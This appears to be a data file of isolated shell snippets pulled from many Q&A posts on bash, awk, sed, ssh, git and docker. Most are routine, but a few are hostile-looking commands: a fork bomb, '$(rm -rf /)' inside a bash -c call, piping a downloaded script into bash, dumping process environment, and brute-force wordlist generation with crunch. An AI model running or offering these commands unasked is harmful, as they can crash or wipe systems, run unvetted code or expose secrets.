parameter expansion
self.Server('10.0.0.x', '00:00:00:00:00:0x', x)
cd: /VAR/GPIO/: No such file or directory
cat -A check
ls -l
cd: /VAR/GPIO/: No such file or directory
head -1
grep -m 1
sed -r "s#$templt_name##; s#\".*##; s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[m|K]//g"
man bash
"$(( $* ))"
echo "$CMD"
while read l; do echo "$l"; done <<< "$(who)"
alias name=value
shopt -s expand_aliases
export -f ttt
builtin cd /my/direc/tory
:at "#" stuff "pwd^M"
:at "#" stuff "ls^M
uniq -c
system("ls -1");
pod install
pod update
-type d
tar cvfz backup.tar.gz {}
[[ ]]
import your_package;
system( `sed -i 's/[ 0-9]+) //' fileName` );
sed -i 's/[ 0-9]+) //' fileName
bash script
[[ $count -eq 2 ]] && break
man ping
typeset -n
hello world
set +m
{ cmd & } 2>/dev/null
grep -o
var2="some text containing "double quotes"'
/usr/bin/python3 ./whatever
/whatever/interpreter: bad interpreter: no such file or directory
-F '\n'
$1 = $1
resDir = /home/username/repo/results
[[ ]]
x=(1 1 1 2 2 3 3 4 5 5)
man grep
Core i5
while :
echo "$msg"
You selected nothing
while :
while :
${c##* IP}
' '
function nc_input {
echo "ABCD,R,1,5151670,512173140137353,01141456843,0"
nc_input | nc 10.200.16.223 7913
1234 45678
set -e
set -e
|| true
eval cp $(echo "'a b' 'c d'") target
cp $(echo "'a b' 'c d'") target
'a b'
set -x
'a b' 'c d'
{ … } > "$config"
postmulti … create
read new ip domain junk
read -r
sed -e '…editing script…' "$@" | while read new ip domain
BFG Repo Cleaner
git filter-branch
echo $PATH
/c/Program Files/Boot2Docker for Windows
Boot2Docker for Windows
sh myscript
sh myscript
bash myscript
VAR1..N = 1
! test
wget -N
do shell script
set connected to true
do shell script
do shell script
subprocess.Popen(helper1.sh, shell=True, stdout=out, stderr=subprocess.PIPE, close_fds=True)
--dir /some/location/
cat {}
bash -c
"read string"
name name1 name2 ...
' \t\n'
read -r name name1
hello world
name="hello world"
"hello big wide world"
name1="big wide world"
git help -a
git help -a | grep credential-*
tr -d '\r' < win-file.txt
illegal option
/bin/bash ./[script]
sudo [commandInTheScript]
remote_function | tr -pro 3
help printf
date -d
system(paste("printf \"%s\t\" NAMES n{1..1600} >file_o"))
GNU Parallel
man bash
myscript.pl <filename>
column -t
gawk -i inplace
ps -u
filename expansion
sudo apt-get install ffmpeg
ls -lt | tail -1
awk '{print $NF}'
xargs rm -rf
man sed
sed -e "\$aDNS3=" -i filename
echo -E
echo -e
du -S
-d /var/www/.versions/*/
rm -r
cut -d ' '
cut -d ':'
java -jar ...
sbcl --load file.lisp
(with-input-from-string my-modified-input read)
awk '/code 403/ {print $8}' error.log | sort | uniq -c |sort -n
/code 403/
uniq -c
un.sh < vec
:set nobin eol
NOT IN
tar --create --gzip --file=$DESTDIR $FILENAME $SRCDIR
tar --create --gzip --file=$DESTDIR$FILENAME $SRCDIR
tar: Removing leading '/' from member names
[[ "$projects" =~ *"\'" ]]; echo $?
while [[ "$projects" != "'"?*"'" ]];do
xxd -p
find . -type f -name
find <dir> -type f |  ack --nofilter --literal --files-with-matches 'SearchTerm'
DIR_1="/var /root /sbin /bin /etc /lib /www /usr /mnt";
CAL_1=$(du -skc $DIR_1 | awk '{print $1}' | tail -n1);
ls -l $DESTINATION/$FILENAME
du -k
sed -i -e '1s/\\tn0\s*/\t/' -e '1s/\s*\(hilu\)/\n\1/' filename
bash: gethostip: command not found
which gethostip
[! ]
echo ${somestring%%rc*}
> output.csv
splice.pl file1.csv file2.csv file3.csv
rm -r
rm -rf data
rm -rf
find .
set -x
set -x
file /usr/bin/make
uname -a
uname -p
process substitution
a = 1
a= foo
[[ ]]
tail -r
tail -r
while [ -f *" " ]
while [ -f *" "* ]
echo 'something' >> $file
>> filename
echo "foo" >>file
bash IProject.sh
bash -h IProject.sh
bash -h IProject.sh
sync.exe "profile name or id"
echo $PATH
man path_helper
column -t
<git-core directory>
echo "output $?"
PS1="[\u@\h \W]\\$ "
PS1='\[\e[0;31m\][\u@\h \W]\$\[\e[m\] '
sed -e 's/\([A-Z]{3}:)/\n\1/g list1.txt > list2.txt
bash -c
"echo "\$$VAR""
'echo $1' 2 3
"echo \"\$$VAR\""
'echo "$1 2 3"'
bash -c
bash -c
sh -c
bash -c
bash -c
sh -c
$(rm -rf /)
bash -c
bash -c
mkdir -p mgc/${spkr}
grep -m 1
printFmt "$STORED_PROCS_FINISHED" "/([01])/"
-m 1
bash2pyengine ./test
cxfreeze ./test.py
test.py -> 38bytes
test (binary) -> 1.3MB
(binary and it's dependencies) -> 6.5MB!!!
ls -al
sshpass -p password ssh hostname
sshpass -p password ssh hostname ls -la
[ -t 0 ]
syntax error : arithmetic operator invalid
3 * 2
echo $string
echo "$string"
printf '%s\n' "$string"
$ foo sub<TAB>
$ foo subcommand
foo <arguments>
prog v1.1
prog v1.2
prog v1.3
prog v1.1
VAR1 = VAL1
prog v1.2
VAR1 = VAL2
if file exists; do this; else do that
Environment modules
/usr/libexec/webmin/foobar/script /path/filename.tar
/path/to/script /path/to/foo.tar
/path/to/script /path/to/foo.tar
/bin/sh /usr/local/bin/snmp-20
snmpget -c public -v2c localhost  1.3.6.1.4.1.45919.1.120.5
source /root/snmp.cfg
NR>1 {}
awk -F'|' -v OFS='|'  'NR<1 {exit} {$5=0.0;7}'
awk -F'|' -v OFS='|'  'NR<1 {exit} {$5=0.0}7'
NR==1 {next}
.import FILE TABLE
(minlat[1], maxlat[1]), (minlat[2], maxlat[2]), ...
tail -f
wget -c
tail -f
-o /dev/null
-O $FILE
tail -f
var=$(printf )
foo *  bar ​
"$1" "$2" "$3"
grep -o
sed -r
$managementipmask= 111.111.111.111/24
10.times { puts "hello" }
msg = gets.chomp
set -x
xinput list | grep TouchPad
touchpad=$(xinput list | grep TouchPad)
xinput set-prop 14 "Device Enabled" 0
pid = $(</home/file.py)
export MONGO_URL="mongodb://127.0.0.1:27017/<dbname>"
mv Folder/ ~/Documents/Folder1/Folder2
cd ~/Documents/Folder1/Folder2
$ mkdir folder
cd folder
"<cmd> ; cdd"
batch -f sort.sh
at -f sort.sh now + 10 minutes
egrep '2$' < <(echo -e 'ha hb hc\na1 b1 c1\na2 b2 c2' | tail -n+2 | cut -d' ' -f2)
echo -e 'ha hb hc\na1 b1 c1\na2 b2 c2'
tail -n+2
cut -d' ' -f2
egrep '2$' < <(xxx)
($0 ~ filter)
'NR <= skip { next } { print $column }'
NR <= skip { next }
{ print $column }
-v skip=1 -v column=4
require dirname(__FILE__).'/includes/validate.php';
else if($_POST['email'] && ($_POST['work_email'] == "")){
sed -f script.sed sendmail1.php
-i inplace
sed -i
command not found
psg(){ ps aux | grep "${@:-$USER}" | grep -v grep; }
2>&1 1>/dev/null
2>&1 1>&3
exec 3>&2
chmod 644
find -name 'test*' ! -name 'test32' -print0 | xargs -r0 chmod 644
"param 1" param2 param3
param 1
source bin/activate
bash: type: deactivate: not found
CentOS 5
Ubuntu 14.04 LTS
sh runMyScript.sh
Activating ABC{10..99}DEF
CentOS 5
[bash|ksh|whatever] script.sh
sh conf_nagcpanm.sh
pygmentize -g
-v RS='/a'
length($0)>max{longest=$0; max=length(longest);}
END{print longest;}
s|^(.*)\x00.*|I found "\1".|
6 13 17 ...
new VideoInfo ...
new VideoInfo\(
[ $ARG=="clean" ]
@(some str)
date --date="some str" +%s
from @(-1 week) to @(-1 day)
from 1435830929 to 1436349343
from 1436435800 to 1436954213
while read
xargs -n 5
( ... )
for string in (some random strings to print) ; echo $string
echo _$string
bind 'set page-completions Off'
set completion-query-items 0
sudo modprobe \t\t
sudo modprobe
2> file
set -o emacs\n
sudo modprobe <Esc>*
echo [list of modules] > file
-type d
man find
grep -F "$pattern"
dockervim <filename>
grep -x
sed --in-place -r ...
./my_bash_script.sh aAa bBb cCc
source common.sh
%include SPECS/common.spec
ls -1
hey there
find . | xargs grep "key1"
sed -r "s/,{2,}/,/g" filename
01, 02, 03, 04, 05, 06, 07, 08, 09, 010, 011, 012.
010, 011
' ' < '0'
echo "$((fields[0]+1))"
alias alibackup="rsync -av --delete '/home/usrname/.bash_aliases' '/media/usrname/External Drive Name/aliasbackup/'"
echo $?
sed -i '/^[0-9]/ !d' *.txt
map {[$_, (split)[0]}
map {$_->[0]}
histgrep.sh ssh
history | grep ssh
grep -Rnoi 'foo' *
grep -Rnoi 'foo' * | grep [excludeMagicOption] 'foobar'
grep --help
grep -E
npm install
php composer.phar <params>
composer <params>
php ~/sources/composer.phar <params>
man sudoers
load port
./sender.sh jobfile.txt
bsub [bsub args] "path/to/example.sh arg1"
for x in $folder1 do exec grep -v "\"" $x | 'wc -l' > "$x.NEW"
567 AMS_01_ex345_2012040000000_0001235.NEW
printf -v num
wc -l
wc -w
>/dev/null 2>&1
ssh -i file root@IP2
ssh -i $file root@$IP2
networksetup -printcommands
networksetup -help
/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -i
dos2unix file.sh
sudo apt-get install dos2unix
M-x whitespace-mode RET
test2 -> test
".baf fled/f<>foo2."
boot2docker shellinit
$(boot2docker shellinit)
ssh $usr@$machine 'bash -s' < a.sh "param1" "param2"
read alternateValue
type ninja
grep -E
man grep
cat 1.output
real time
12:piece lengthi
12:piece lengthi
(?<=:)(.*)(?=12:piece lengthi)
grep --text
strings file |
head -1 file.torrent| strings | tr -d "\n\r" | iconv -f utf-8 -t utf-8 -c| sed 's/.*:\(.*\)12:piece lengthi.*/\1/
sed -n "w ${DUMP_FILE}"
dd status=none of=${DUMP_FILE}
man zip
zip -@ foo
1 && {}
! {
[ $i -lt 5 ]
[ $i -gt 5 ]
[ $i -gt 5 ]
echo "$i > 5"
echo "$i > 5"
echo "$i = 5"
echo "$i = 5"
false && { echo 1; true; }
false || true
true && { echo 2; true; }
true || false
true && { echo 3; true; }
bash callone.bash 2>stderr.txt >stdout.txt
for $filename in 1.txt
XX command not found
else if
.ll 80
ON DUPLICATE UPDATE
bash: alias: /Applications/Microsoft Office 2011/Microsoft Excel.app/Contents/MacOS/Microsoft Excel’: not found
alias excel='/path/to/open
$1 == ($1+0)
{ print }
<space><carriage return>
mytool --help
Run/Debug Configurations
Environment variables
echo $PATH
a[$1] > 1
sed i s/xxx/mod_to_make/ <user_config_file>
git clone <plugin>
wget <plugin>
./script.sh &
@reboot /home/user/folder/script.sh &
sudo reboot
echo | tr | sort
{ …; }
sh script.sh
bash script.sh
bash -x script.sh
bash script.sh
cvt 1280 760
grep \" |
"(one or more spaces)
seq FIRST INCREMENT LAST
mplayer file1 file2
< infile
> outfile
(( expr ))
[[ ... ]]
docker run -d
split(s/ {1,}//,$_)
open ( my $input_fh, "<", $i_file ) or die $!
my ( $var1, $var2 ) = split;
which python
2015-06-06 2015-06-13 2015-06-20 2015-06-27 2015-07-04 2015-07-11
bash -vx <script>
sudo ip netns exec frootvpn openvpn --config /etc/openvpn/frootvpn.conf
exec bash
sudo date
> settings > network
mencoder mf: //*.jpg -mf w = 1366: h = 768: fps = 6/60: type = jpg -ovc copy -oac copy -o images.mp4
./hpcin.sh line 2: bsub: command not found
git tags
rm rm # rm
$RM $RM # rm
sed -i 's/\(^\|[^[#.*]]\)\brm\b/\1$RM/' file1
$RM rm # rm
diff -Naur
npm run start-dev
npm run start-wds
scp -r
tar czf - ...
<= n
cat runs.txt
$1, $2, $3,...
./my-script.sh firstarg secondarg thirdarg
ssh B
ssh B
ssh B foo
ssh -t B foo
ssh B foo
ssh -t B foo
ssh B
ssh B ls -A
ssh B cat example.tar.gz | tar -xf - -C /tmp
echo "This will be appeared in STDOUT" | ssh B cat
cat example.tar.gz | ssh B tar -xf - -C /tmp
cat excample.tar.gz| ssh jgn-mba tar -xf - -C /tmp
| tee ~/Desktop/tee.log |
[ -n "$pkg" ]
[ "$pkg" = "." ]
Run executable or batch file
Run script
hive -e "command" command
ls -alF
. ~/.bashrc
. ~/.bashrc
. ~/.bashrc
curl $url | python -mjson.tool | grep (something) | awk (something)
python -mjson.tool $json
python -mjson.tool <<< $json
[$err == 0]
[ == 0]
system("/path/to/bash C:/script.sh file.png &")
script.sh "concat_001.fastq"
'.alertId,.headline,.includedItems | length'
'(.alertId,.headline,.includedItems) | length'
.includedItems | length
python.py abcd
python.py efgh
Syntax error: "(" unexpected
GNU find
xmlstarlet ed -d xpath
date --date=exp +%s
$(date +%s --date "now _expression_")
-2 days
echo "..."
ln -s /Library/TeX/Distributions/TeXLive-2013.texdist/Contents/Programs/texbin/ /Library/TeX/texbin
sudo sed -i  -e "s/usr/Library\/TeX/" /etc/paths.d/TeX
sudo sed -i  -e "s/usr/Library\/TeX\/Distributions\/TeXLive-2013.texdist\/Contents\/Programs/" /etc/paths.d/TeX
$(for i in directory/*; do echo -ne $i" "; done)
$(shopt -s nullglob; echo directory/*)
show_rhs() { echo "${1%=*}='${1#*=}'"; }
kill -9 $pid
rename 's/^fgh/jkl/' fgh*
rename fgh jkl fgh*
cut -d_ -f...
./greetingToAll.sh "Tom"
./greetingToAll.sh "Mary"
date -u
Tue, Jul 14, 2015  2:52:47 PM
date -u
Tue Jul 14 14:52:27 UTC 2015
Tue Jul 14 14:52:27 UTC 2015 (%a %b %d %H:%M%S %Z %Y)
open -a Terminal .
nmg_1, nmg_2,..., nmg_5
fol, unf
man xargs
bash calculate.sh < input.txt
echo "$((3+4))"
setuid normal_user
exec start-stop-daemon --start -c myuser --exec command
exec su -s /bin/sh -c 'exec "$0" "$@"' $user -- /path/to/command --arg1=foo -b wibble
exec sudo -u $user command
crunch 10 10  "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ" | pv >/dev/null
1906501 lines per second (20×2^20/11)
36^10÷(20×2^10÷11) seconds ==
36^10÷(36^7×10^3) = 46 times
tr -d '\r' < bu.sh > newbu.sh
wc -l
cat outimage.png
cat outimage.png
cat outimage.png
paste -d';' file file
print $1
sed -n
grep '(spal,afra)' file
cut -f1
wget http://opendata-download-metobs.smhi.se/api/version/1.0/parameter/2/station/178970/period/corrected-archive/data.csv
for x in {1..N}; do curl ftp/site/file${x} > file${x}
ambiguous redirect
curl -O ftp/path/to/site/*glob_pattern*
Group By
1 2
git branch -r
git branch --track origin/master
sed -rn
/^[[:space:]]*key[ =]/
{print $3}
(IFS=$'|'; cat setA.txt | while read x y z; do grep -q -P "\Q$x|$y|\E" setB.txt || echo "$x|$y|$z"; done; )
for target; do …; done
for target in "$@"; do …; done
echo "$out" > outfile
aws configure
sudo aws configure
sudo -H -u thatuser aws ...
pip install awscli
aws configure list
aws configure
unable to locate credentials
role_arn =
aws configure list
aws kms decrypt
sudo aws ec2 command
unable to locate credentials
aws configure
--profile user1
aws configure
curl -v http://localhost:8000
cat /media/DRIVENAME/BACKUPNAME.tgz.* | tar -x /
[[ ]]
cat /proc/$$/environ
sed 's/find/replace/' file
0 8 * * * Me echo "start working please"
this is the line number 13 from /etc/crontab
substrings(.split(' '))
dict(os.environ, PGPASSWORD="-------")
command is <cmd>
sed -i.bak s/old/new/ filename
man sed
sed -i ''
cut -c3-
printf %q
printf -v
-printf '%P\n'
sqlplus DB_USER/password@abc @test.sql
($( ... ))
sh -c "your long command"
cat backup.sql | docker exec -i CONTAINER /usr/bin/mysql -u root --password=root DATABASE
user@home:~$ torify openssl s_client -connect smtp.gmail.com:587 -starttls smtp < /dev/null 2>/dev/null | openssl x509 -fingerprint -noout | cut -d'=' -f2
fg && mail -s "foo is done" me@com.com
wait %1 && <command>
wait; <command>
mkvirtualenv newenv
pip freeze
pip freeze
grep -o
controller     : 'widgetListController',
man bash
some-command | sudo othercommand
CREATE EXTENSION postgis;
awk '{FS=",";print $2}'
echo -e
man awk
read first second rest
printf '%s\n' "${array[*]}"
$' \t\n'
while read
pandoc: Could not find data file /dev/fd/63.latex
set -x
docker images
docker images | sed 1d | cut -d" " -f1
snapshot1.xyz (with the 100th snapshot)
1 2 3
chmod a+rx countries.sh
-A 1
echo -e
printf "\033c"
path/1437043449 -gt 1437001200
1437043449 -gt 1437001200
' '
[^ ]
mv file dir/
cat file | sh
function1 log1  > log1.log 2>&1
kill $PID
kill -9 $PID
kill -9 hangs
kill -9
PID 16635
kill -9
kill -9 process (PID 17172)
"kill -9"
kill -9
kill -9
timeout -s 9 2 kill -9 $PID
kill -9
kill -9
kill -9
kill -0
kill -9
wc -l filename.txt
cut -f 1 -f ' '
head -$i
tail -1
-maxdepth <depth>
-name <pattern>
-exec <cmd> {} \;
help printf
sed 's/../.&/;t;s/^.$/.0&/'
printf "%.02f\n" $i;
sed 's/\.//;s/^0//'
gsub(/9+$/, ".&", $1)
if ($1>max) max=$1
hostapd_cli reconfigure
zgrep --version
$CNEW = ''
-v s="$CNEW"
/WORD_MATCH/ { n=1; if (s) $0=s; else next; }
END { if(s && !n) print s }
put foo/file.bar
java -version
cd /System/Library/Frameworks/JavaVM.framework/Versions/
sudo ln -s /Library/Java/JavaVirtualMachines/jdk1.7.0_79.jdk/Contents CurrentJDK
man 5 init
node myapp.js
[ ... ]
[[ ... ]]
find . -type f -perm 0777
ls -l | awk '/rwxrwxrwx/{print $0}'
numbersort.sh input-txt
&& mv -- "sorted-$1" "$1"
sudo rm -rf
ARCHFLAGS='arch x86_64'
ARCHFLAGS='-arch x86_64' python setup.py install
no such file or directory
/path/to/same/python2.7 setup.py install
which python2
which python
vagrant up
Argument list too long
bash alternative_cd.sh
function setSub
function testSub
shopt -s dotglob
git clone
sh load.sh start | stop
./load.sh start | stop
sh script.sh
./load.sh start | stop
sh load.sh start | stop
echo "$psswd" | base64 > .pass
read -n 1 -s c
Last login to server etc..
stream_set_blocking($shell, true)
"hello world"
-type f
objdump -s /usr/bin/dosbox | grep "\%03"
awatch *0x5fa9c7
_startDate="07/14/2015 00:00:01 UTC"
echo $DATE
-H 'Content-Type: application/json'
curl google.com
curl http://google.com
curlwrapper -H "foo: bar" -XPOST google.com -d '{"hello":"world"}'
--proto-default https
service servicename stop
service servicename start
service servicename stop
log_message(_sanitize("my string"));
newscript myscript "This is what my script is about"
syntax error: unexpected end of file
| magic-sudo
while r for i
grep -v -f
\n: command not found
sudo pip
echo -e
zcat: unknown compression format
find /var/spool/exim/msglog -exec grep -l login:email@example.com {} \; | sed 's/\/var\/spool\/exim\/msglog\/.\///' | xargs exim -Mrm
./delq.sh mail@example.com
find ... -exec login:$1 ...
-v var=value
dummy = expr(i)
dummy = 2
dummy = ${argument1}
dummy = 60300
Redhat 7
./buildscript.sh branch_name
sudo -v
./count_trimers.pl < your_input_file.txt > output.csv
Hello, world!
-name '.*'
-printf '%f\0'
OUTPUT folder
-O file
-O -
'\d{2}\/\d{2}\/\d{2}\s\d{2}:\d{2}:\d{2},\d{9}','DD\/MM\/RR HH24:MI:SSXFF'
stat -c %Y ...
-n 1
-n 1
-d ''
Subject does not start with '/'.
Subject Attribute /O has no known NID, skipped
awk -F'&'
awk -F'&' '{print $2}'
sort -t '|' -k 3,3nr -k 1,1 -k 2,2 input.txt > output.txt
-k 1,1 -k 2,2
/usr/bin/find "${SRCROOT}" -name splunkmint_postbuild_dsym_upload_script.sh | head -n 1
source ~/rosbuild_ws/setup.bash
. ~/catkin_ws/devel/setup.bash
XYZ User ID:
[ "9" -lt "10 ]
column 3, row 4
s3smd ls
/bin/sh -c
export -p
foo bar
rerun ./parent.sh
watch "ps -ef | grep pts/4"
fuser -k
logger -p local.warn 2>> /to/file/
tail +2
sed -e 1d
basename "$file"
please install some_command first
local conf_path="$(get_conf_dir)/foo.conf"
please install some_command first/foo.conf
exit 200
echo "..." 2>&1
exit 100
set -x
local path=$(some_command)
Returned: 1
Returned: 0
local path
exit 100
exit 100
VARIABLE_NAME=$(INTERPRETER -c "EMBEDDED CODE")
INTERPRETER -c
R --arch i386 -q --slave -e
-e expr
man Rscript
<!doctype html>...
/<!doctype html>/{f=1;print "    <hr />";}
<!doctype html>
/<h1 class=/{f=0;}
<h1 class=
echo "$variable"
curl --fail
sleep 5 | true
strace -f -e clone bash -c 'sleep 5 | sleep 5 | sleep 5'
sleep 5 | sleep 5 | sleep 5 & pstree -p $$
sed 's/.*href="\([^"]*\).*/\1/p'
-O -
302 Found
--include ~/Library/Mail
| uniq -c | sort -nk1 | uniq
awk '{print $1}' "${ACCESSLOG}" | sort -n | uniq -c | sort -nk1
awk '{if(ips[$1]) {ips[$1]++} else {ips[$1]=1}} END {for (ip in ips) { print ips[ip], ip}}' "$ACCESSLOG" | sort -nk1
awk '{ips[$1]++} END {for (ip in ips) { print ips[ip], ip}}' "${ACCESSLOG}" | sort -nk1
0 "HDMI 0" 2 "ALC3232 Analog"
find -name foo.py -print | python
date -r $TXTFILE +%s
aws s3api list-objects
aws s3 ls BUCKET-NAME
Something went wrong :(
/ /
python colfixer.py original.csv >final.csv
/TRANSACTION START/{file="trans_"cont++".txt"}
{print $0 >> file}
echo "hi\c"
echo -n "hi"
printf "hi"
apt-get install -y packagename
python ...
fi } trap
fi } echo
test.py; fi function
Syntax error at or near "\"
declare -i NX=0
ruby program.rb file.csv
grep <pattern> <file>
DEVICES=( $(some|command) )
diff file1 file2
grep -f file pattern
seq 10
seq 20
seq 10
seq 2 20
tr '\n' '\r'
a[line_number] = line
ps aux | grep '[m]ono ./' | awk '{print $2}'
ps $( command )
ps $(command)
grep '[m]ono ./' | awk '{print $2}'
awk '/mono .\// {print $2}'
[ "$FILE" = "*.zip" ]
[[ "$FILE" = *".zip" ]]
[ "$FILE" = "*.tar.gz" ]
[[ "$FILE" = *".tar.gz" ]]
/bin/bash --login
--add-host=dockerhost:$(ip route | awk '/docker0/ { print $NF }')
-v name=value
-v name=value
print $0
awk '{ips[$1]++} END {for (ip in ips) { printf "%5s %-1s %-3s\n", ips[ip], "⎟", ip}}' "${ACCESSLOG}" | sort -nk1
host 72.80.99.43
43.99.80.72.in-addr.arpa domain name pointer pool-72-80-99-43.nycmny.fios.verizon.net.
awk '{ips[$1]++} END {for (ip in ips) { printf "%5s %-1s %-3s %20s\n", ips[ip], "⎟", ip, system( "host " ip )}}' "${ACCESSLOG}" | sort -nk1
var 2>&1 > >(tee $LOGV)
ps -ef | grep xx.jar
bash -c nohup java -jar <xx.jar>
print_args $foo
wc -l <<< $SILENT_LOG
no warnings 'syntax';
\1 is better written as $1
rm -r /var/log/jenkins/*
sudo rm -r /var/log/jenkins/*
suro rm -r /var/log/jenkinks
npm outdated
from 's3://<bucket>/<key>/'
# \u@\h:\w (\[\e[32m\]${__git_ps1_branch_name}\[\e[0m\] \[\e[31m\]*\[\e[0m\] u=) $
name_12.txt name_13.txt name_1.txt name_2.txt
ls -v *.txt
. ./second.sh
parallel --dry-run
awk '$1 > 1e-15'
gawk -v PREC="double" '$1 > 1e-15'
make runworker
make runnotify
du -h
du -sh
for path in $(awk -F: '{if ($3 >= 1000) print $6}' < /etc/passwd)
disk_usage=0; disk_usage=$(du -s ${path} | grep -oE '[[:digit:]]+')
echo "$path: $(echo $disk_usage | tail -1 | awk {'print $1'} | awk '{ total = $1 / 1024/1024 ; printf("%.2fGB\n", total) }')";
total=$(IFS=+; echo "$((${myAssociativeArray[*]}))")
echo "Total disk usage: $(echo $total | tail -1 | awk {'print $1'} | awk '{ total = $1 / 1024/1024 ; printf("%.2fGB\n", total) }')";
bsd sockets
set -e
MULTI LINE COMMENT
MULTI WORD COMMENT
int((NR - 1) / 2810)
% 10 == 0
sed -n
Package name is GarageBand
launchctl list |  awk '{for (i=1;i<=NF;i++) if ($i>=1) print $i} '
launchctl list | awk '{ print $2 }'
gnuplot -persist
values="grid xrange[0:10]
set grid
set xrange[0:10]
xargs grep
ls -t | head -5 | grep abaaba
ls -t | head -5
awk  -F':' -v search="$title" '$1 ~ search { i++; printf "%s, %s,$%s,%s,%s\n", $1, $2, $3, $4, $5 } END { printf "%d records found\n", i }' BookDB.txt
$1 ~ search
index($1, search)
book not found
set -x
brew install wget
END{for (dev in a)print dev,a[dev];}
docker exec [OPTIONS] CONTAINER COMMAND [ARG...]
RUN echo "/scripts/bashrc" > /root/.bashrc"
-i -t
while ... read
? [C]
cat <$readpipe &
read -N1
aws route53 change-resource-record-sets
'cd ~'
cd ~
cd ~
cd $(echo '~')
cd "~"
cd ~
cd ~
cd $HOME
cd /home/YourUsername
wc -c
wc -c
wc -c
wc -c
hexdump yourfile
wc -c
redis-cli keys \* | xargs -L 1 redis-cli get
echo -e
$ wstorm .
^ *test *$
sort -u
fdupes -r .
fdupes -r -f .
read -a
$(( ... ))
(( ))
[[ ]]
(( ))
sed '2 p'
head -2 | tail -n 1
git log
grep --help
grep -c
echo '1 2' | xargs -d ' ' -I % echo %
echo -n '1 2' | xargs -d ' ' -I % echo %
<hosts.txt xargs -I % <ssh-command>
< <(tr ' ' '\n' < hosts.txt) xargs -I % <ssh-command>
npm script
kill -INT $(jobs -l | awk '{print $2}')
[[ ... ]]
[ ... ]
./vendor/bin/phpcs --standard=PHPCompatibility --runtime-set testVersion 5.6 <path-of-your-php-files>
docker commit
docker events
adb shell ps | grep "org.mozilla.fennec"
adb shell ps | grep "org.mozilla.fennec$"
ls /root/Working/awk/*
Strings are not a match
ls *.txt
sed -i
echo -ne "[||...] Processing ${file_name}\r"
tput cuu 2
tput el
match(str, regex)
cd /mnt/mongo-test_backup/1/local
rm *.json
mv oplog.rs.bson oplog.bson
DEBUG=* node index.js
sh your_script.sh
sh -n your_script.sh
exec 3>&1
2>&1 1>&3
mrg deb* outputfile
cat deb* > outputfile && rm deb* -f
$1-> deb_1,$2-> deb_2
"deb01" "deb02" "deb03"
python manage.py runserver
-type d ! -readable -prune
-u fd
perl -lne 'BEGIN{open $in1,shift; open $in2,shift} while($n1=<$in1> and $n2=<$in2>){print $n1+$n2}' file1.log file2.log
seq 999999 > file1.log ; seq 999999 > file2.log
(echo $string) | parallel
($string) | parallel
grep -oP
20/07/2015 09:40:00
>> $logfile
./script >> filename
-d '/list/version[last()]'
-i '/list/version[1]' -t elem -n version -v 1.6
ghc -O2 answer.hs
", "
' ':
notElem sub
notElem (dropWhile isSpace sub)
bash -x
crontab -l
ls -a .sh
ls -a $HOME/Dropbox/temp_scripts/.sh
bash -x
wc -l
grep -o
wc -l
where socialr_host = "http://$NEW/"
-perm /<bits>
while true
+=( )
git log --all
git reflog
git branch --verbose
git remote --verbose
filesplit -u
filesplit --update
[[ ... ]]
printf -v varname "%s" value
unset lines[4]
eval line$i="$line"
eval "line$i='$line'"
. ~/.bash_profile
{"error":{"type":"invalid_request","message":"Failed to parse JSON body.","cat":"(=^‥^=)"}}
{ }
cat filecount.txt
cat /home/user/Desktop/scripts/filecount.txt
man grep
capture group
capture group
\curl -L https://get.rvm.io | bash -s stable
while !
> /dev/null
tr -s ' '
socat /dev/ttyUSB0,b9600 STDOUT
exec 0<&3
> $FILE
echo "DOWNLOAD_URL: ${DOWNLOAD_URL}"
echo -e
od -c
/^Location: (.*)$/
/^Location: (.*)\r\n/
brew linkapps python
pip install powerline-status
awk -v anshostgroup="${ANSHOSTGROUPS[2]}" -v insert="dc01.fritz.box ansible_ssh_host=192.168.4.27" '$0 ~ anshostgroup{$0=$1 ORS insert}1' hosts
Happy Day
Mary Ann
Happy Day
Mary Am
(*) WORD
read -n1
-d ''
$ret || 1
curl -v www.example.com
-H 'Cache-Control: no-cache'
date +%s
-H 'Pragma: no-cache'
-H 'Cache-Control: no-cache'
zsh: no matches found
{"message":"Hello, Terraform!"}
echo "$VARR" >> /home/user/result.txt
ls -ltr /path/to/dir
sh <scriptname>
which python
bundle binstubs --path mri-bin
-d @fileName)
The server encountered an error and could not complete your request.
$! > lastPID.txt
yourscript -n
sudo yourscript -n && mail -s "Processing complete" you@example.com
sudo "$0"
d=0; q=0; cat file |while read -r c p; do if [[ $c = $d ]]; then printf "$c\t$p\t$q\n"; fi; d=$c; q=$p; done
g++ -std=c++17 -w -O3 main.cpp -o readkey
ioctl(fileno(fpKbd.get()), EVIOCGKEY(sizeof(keyMap)), keyMap);
tail -n 1
&> /dev/null
1>&- 2>&-
find ~ size +500M
cat a[1]
man xargs
myarray=( $(command) )
ps -ef
runsv opscenter-agent
sv stop opscenter-agent
ps -ef
-W depend=afterok:jobid
Total mtaLogs count is <some count>
:(){ :|:& };:
awk '!(NR==3)'
FNR==3{print "/* */";next}
$ autoexpect thecommand
$ expect -f script.exp
grep -v "processname"
grep -v grep
grep [a]bc
pgrep -x abc
a b
"a" "b"
log1 "${X[*]}"
man bash
echo "${X[*]"
log2 "${X[*]}"
a b
echo "${X[@]}"
log2 "${X[@]}"
set -x
log1 "${X[*]}"
log1 "a|b"
echo a b
log1 "${X[*]}"
cat build.json | jq '.property | .[] | select(.name=="test1")'
ERROR 3
( cat ukv01stats.txt | while IFS=: read f1 f2 f3 f4 ; do echo "$f1 - $f2" > temp_ukv01stats.txt;  done < ukv01stats.txt ; for file in ${jarListFiles[@]}; do read f1 f2 f3 f4 ; echo "$f1 - $f2" > temp_$file; done < $file ;  diff temp_ukv01stats.txt $file )
diff -R directory1/ directory2/
printf '[%s]\n' "$s"
bash -x
cd /
cd //
cd ///
cd //
Permission denied
chmod /R 777
rm -rf hooks
ln -s ../git_hooks hooks
pacman -Su winln
winln -s target link
files=( templates/*.tex )
files=( templates/*.tex )
for file in "${files[@]}"
echo "git adding"
$i, $j
MATRIX[$i * $MW + $j]
MATRIX[$i, $j]
grep -rnw . -e "sometext"
set -o errexit
-iname pattern
read -n 1
C:\\ProgramFiles\ is\ a\ Windows\ path\;
cp -R
man rsync
sudo su
environment settings (PATH)
sudo -i
man find
$(find ...)
ps aux
chmod -x
APP=$(which my_app)
ls -l /path/to/your/my_app
ln -s /crazy/path/to/your/my_app /usr/bin/
~0 == -1
<( )
command &> file.txt
